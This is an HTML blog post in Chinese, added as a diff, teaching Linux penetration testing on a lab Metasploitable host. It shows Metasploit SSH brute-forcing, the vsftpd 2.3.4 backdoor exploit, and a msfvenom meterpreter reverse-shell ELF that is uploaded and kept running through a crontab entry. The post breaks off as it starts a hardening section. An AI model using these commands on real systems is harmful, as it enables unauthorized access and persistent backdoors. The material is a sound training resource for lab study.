@@ -1,0 +1,521 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全-Linux渗透测试4 | Nicopilot</title><meta name="author" content="Nicopilot"><meta name="copyright" content="Nicopilot"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="🥧本节讲述SSH暴破、VSFTPD笑脸漏洞利用、Linux后门程序及如何利用后门、Linux安全加固">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全-Linux渗透测试4">
+<meta property="og:url" content="https://www.nicopilot.online/posts/lnxpte4.html">
+<meta property="og:site_name" content="Nicopilot">
+<meta property="og:description" content="🥧本节讲述SSH暴破、VSFTPD笑脸漏洞利用、Linux后门程序及如何利用后门、Linux安全加固">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.nicopilot.online/img/cover/net_sec/10_cover.png">
+<meta property="article:published_time" content="2024-05-11T01:45:43.000Z">
+<meta property="article:modified_time" content="2024-05-11T01:45:43.000Z">
+<meta property="article:author" content="Nicopilot">
+<meta property="article:tag" content="Linux渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.nicopilot.online/img/cover/net_sec/10_cover.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://www.nicopilot.online/posts/lnxpte4.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网络安全-Linux渗透测试4',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-11 09:45:43'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/net_sec/10_cover.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Nicopilot"><span class="site-name">Nicopilot</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网络安全-Linux渗透测试4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-11T01:45:43.000Z" title="发表于 2024-05-11 09:45:43">2024-05-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-11T01:45:43.000Z" title="更新于 2024-05-11 09:45:43">2024-05-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%89/">网络安全（更新ing）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网络安全-Linux渗透测试4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="Linux渗透"><a href="#Linux渗透" class="headerlink" title="Linux渗透"></a>Linux渗透</h2><h3 id="Secure-Shell"><a href="#Secure-Shell" class="headerlink" title="Secure Shell"></a>Secure Shell</h3><p><strong>SSH</strong></p>
+<ul>
+<li>SSH是基于应用层的安全协议</li>
+<li>SSH是专为远程登录和其他网络服务提供安全性的协议</li>
+<li>SSH提供基于密码、基于密钥的两种级别的安全验证</li>
+<li>SSH传输的数据会进行加密，可以有效防止远程过程中的信息泄露问题</li>
+<li>SSH传输的数据时会进行数据压缩，可以加快传输的速度</li>
+<li>远程工具：Putty、FinalShell、MobaXterm、SecrueCRT等等</li>
+</ul>
+<h3 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h3><p><strong>SSH暴力破解工具</strong></p>
+<ul>
+<li>Hydra、Medusa、msf</li>
+<li>大部分攻击都是针对Linux 服务器默认管理账号root，攻击者主要使用admin、 root、123456等常见弱密码进行暴力破解</li>
+<li>少部分攻击是针对tomcat、postgres、 hadoop、 mysql、apache、 ftpuser、 vnc等Linux服务器上常见应用程序使用的用户名</li>
+<li>攻击者不仅使用常见通用弱密码，还会将用户名当作密码进行攻击</li>
+</ul>
+<h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><p><strong>第一步：创建字典</strong></p>
+<ul>
+<li>手写一个简单字典，方便实验验证</li>
+<li>vim &#x2F;root&#x2F;passwd</li>
+</ul>
+<p><strong>第二步：查找MSF辅助爆破脚本</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search ssh_login</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">0</span>  <span class="string">auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：使用辅助脚本进行SSH爆破</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set username msfadmin</span></span><br><span class="line"><span class="attr">username</span> =<span class="string">&gt; msfadmin</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set pass_file passwd.txt</span></span><br><span class="line"><span class="attr">pass_file</span> =<span class="string">&gt; pass.txt</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.10.143</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.143</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第四步：查看会话、切换会话</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; sessions </span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Id</span>  <span class="string">Name  Type         Information  Connection</span></span><br><span class="line">  <span class="attr">--</span>  <span class="string">----  ----         -----------  ----------</span></span><br><span class="line">  <span class="attr">1</span>         <span class="string">shell linux  SSH root @   192.168.10.224:34941 -&gt; 192.168.10.143:22 (1</span></span><br><span class="line">                                      <span class="attr">92.168.10.143)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; sessions 1</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 1...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">whoami</span></span><br><span class="line"><span class="attr">msfadmin</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞利用VSFTPD"><a href="#漏洞利用VSFTPD" class="headerlink" title="漏洞利用VSFTPD"></a>漏洞利用VSFTPD</h3><p><strong>vsftpd_234_backdoor（笑脸漏洞），允许攻击者任意用户登录，以root权限执行任意命令</strong></p>
+<ul>
+<li>用户名以“笑脸”结尾，如xx:)、oo:)</li>
+<li>密码任意输入</li>
+<li>成功后开启6200端口，执行任意命令</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.1.png" alt="10.4.1"></p>
+<p><strong>环境准备</strong></p>
+<ul>
+<li>靶机：Linux</li>
+</ul>
+<p><strong>漏洞利用</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search vsftpd</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">0</span>  <span class="string">exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution                                                 </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.10.143</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.143</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">whoami</span></span><br><span class="line"><span class="attr">root</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h2><h3 id="什么是Msfvenom"><a href="#什么是Msfvenom" class="headerlink" title="什么是Msfvenom"></a>什么是Msfvenom</h3><p><strong>Msfvenom</strong></p>
+<ul>
+<li>Msfvenom是MSF框架配套的攻击载荷生成器</li>
+<li>可以用来生成木马程序，并在目标机上执行，在本地监听上线</li>
+</ul>
+<p><strong>部分参数</strong></p>
+<ul>
+<li>-p选择一个载荷</li>
+<li>-f生成的文件格式，elf(Linux下可执行文件) exe (Windows下执行)</li>
+<li>-lhost 监听地址</li>
+<li>-lport 监听端口</li>
+<li>-o 输出文件名</li>
+<li>-h帮助</li>
+</ul>
+<h3 id="Msfvenom生成后门文件"><a href="#Msfvenom生成后门文件" class="headerlink" title="Msfvenom生成后门文件"></a>Msfvenom生成后门文件</h3><p><strong>第一步：在kali生成后门文件</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：确保开启Linux靶机的root用户，并设置密码root</strong></p>
+<h3 id="上传后门文件至靶机"><a href="#上传后门文件至靶机" class="headerlink" title="上传后门文件至靶机"></a>上传后门文件至靶机</h3><p><strong>在暴力破解成功的情况下，通过kali将后门文件发送到目标主机</strong></p>
+<ul>
+<li>在kali中发送后门文件至靶机的&#x2F;mnt&#x2F;下</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">scp shell root@192.168.10.143:/mnt</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在靶机中查看后门文件是否存在</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# ls /mnt/</span></span><br><span class="line"><span class="attr">newdisk</span>  <span class="string">shell</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：上传可能会报错，是由于kali缺少配置导致的，按照以下步骤进行修复</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">mkdir .ssh </span></span><br><span class="line"></span><br><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">vim .ssh/config</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>config文件中添加以下内容</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Host</span> <span class="string">*</span></span><br><span class="line"><span class="attr">HostkeyAlgorithms</span> <span class="string">+ssh-rsa</span></span><br><span class="line"><span class="attr">PubKeyAcceptedKeyTypes</span> <span class="string">+ssh-rsa</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="给后门文件添加执行权限"><a href="#给后门文件添加执行权限" class="headerlink" title="给后门文件添加执行权限"></a>给后门文件添加执行权限</h3><ul>
+<li>第一步：控制靶机，添加执行权限</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# ls -l /mnt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# chmod a+x /mnt/shell</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二步：控制靶机，后台运行后门程序</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# chmod a+x /mnt/shell</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><ul>
+<li>kali进入MSF，使用侦听脚本，建立连接</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use exploit/multi/handler </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lhost 192.168.10.224</span></span><br><span class="line"><span class="attr">lhost</span> =<span class="string">&gt; 192.168.10.224</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lport 4444</span></span><br><span class="line"><span class="attr">lport</span> =<span class="string">&gt; 4444</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">payload</span> =<span class="string">&gt; linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>备注：如果连接不上，靶机多次执行&#x2F;mnt&#x2F;shell &amp;命令</strong></p>
+<ul>
+<li>进入反弹连接，获取用户信息</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h3><p><strong>Linux crontab命令</strong></p>
+<ul>
+<li>crontab：计划任务，用来定期执行程序的命令</li>
+<li>crontab -e：编辑计划任务</li>
+<li>crontab -l：显示计划任务</li>
+</ul>
+<p><strong>先查看计划任务格式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># m h  dom mon dow   command             //分  时  日  月  周  命令</span><br><span class="line"> 30 6   *   *   *      命令               //每天6点30分执行命令</span><br><span class="line"> 30 6   *   *  1-5     命令               //周一到五6点30分执行命令</span><br><span class="line"> 30 6   1   *   *      命令               //每月第一天6点30分执行命令</span><br><span class="line"> *  *   *   *   *      命令               //每分钟执行一次命令</span><br></pre></td></tr></table></figure>
+
+<p><strong>在靶机上创建计划任务</strong></p>
+<ul>
+<li>-e：执行文字编辑器来设定计划任务，内定的文字编辑器是vi</li>
+<li>EDITOR&#x3D;vim：指定编辑器为vim</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# EDITOR=vim crontab -e</span></span><br><span class="line"><span class="attr">*</span> <span class="string">* * * * /mnt/shell&amp;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>列出目前的任务</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# crontab -l</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="自动运行后门文件"><a href="#自动运行后门文件" class="headerlink" title="自动运行后门文件"></a>自动运行后门文件</h3><ul>
+<li>验证计划任务</li>
+<li>重启靶机，验证kali是否能够连接后台文件</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use exploit/multi/handler </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lhost 192.168.10.224</span></span><br><span class="line"><span class="attr">lhost</span> =<span class="string">&gt; 192.168.10.224</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lport 4444</span></span><br><span class="line"><span class="attr">lport</span> =<span class="string">&gt; 4444</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">payload</span> =<span class="string">&gt; linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="会话放入后台运行"><a href="#会话放入后台运行" class="headerlink" title="会话放入后台运行"></a>会话放入后台运行</h3><p><strong>background</strong></p>
+<ul>
+<li>在渗透的时候，有时需要执行其他任务，为了执行新任务，需要将当前的Meterpreter会话切换到后台，这时就需要用到background命令</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Backgrounding session 1...</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions </span></span><br><span class="line"></span><br><span class="line">  <span class="attr">1</span>         <span class="string">meterpreter x86/linux  root @ metasploitable.  192.168.10.224:4444 -&gt;</span></span><br><span class="line">                                   <span class="attr">localdomain</span>             <span class="string">192.168.10.143:34443 (1</span></span><br><span class="line">                                                           <span class="attr">92.168.10.143)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="多会话管理"><a href="#多会话管理" class="headerlink" title="多会话管理"></a>多会话管理</h3><ul>
+<li>重新运行监听脚本</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler)&gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过session ID快速切换</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 1</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 1...</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 2</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 2...</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux安全加固"><a href="#Linux安全加固" class="headerlink" title="Linux安全加固"></a>Linux安全加固</h2><h3 id="Linux安全基线"><a href="#Linux安全基线" class="headerlink" title="Linux安全基线"></a>Linux安全基线</h3><p><strong>指的是使Linux各项配置都符合安全要求的基本标准</strong></p>
+<ul>
+<li>账号&#x2F;密码：口令复杂度&#x2F;wheel组</li>
+<li>SSH登录控制：禁root&#x2F;改端口&#x2F;密码&#x2F;密钥验证</li>
+<li>文件权限控制</li>
+<li>内核参数调整</li>
+</ul>
+<h3 id="系统加固的必要性"><a href="#系统加固的必要性" class="headerlink" title="系统加固的必要性"></a>系统加固的必要性</h3><p><strong>加固目的</strong></p>
+<ul>
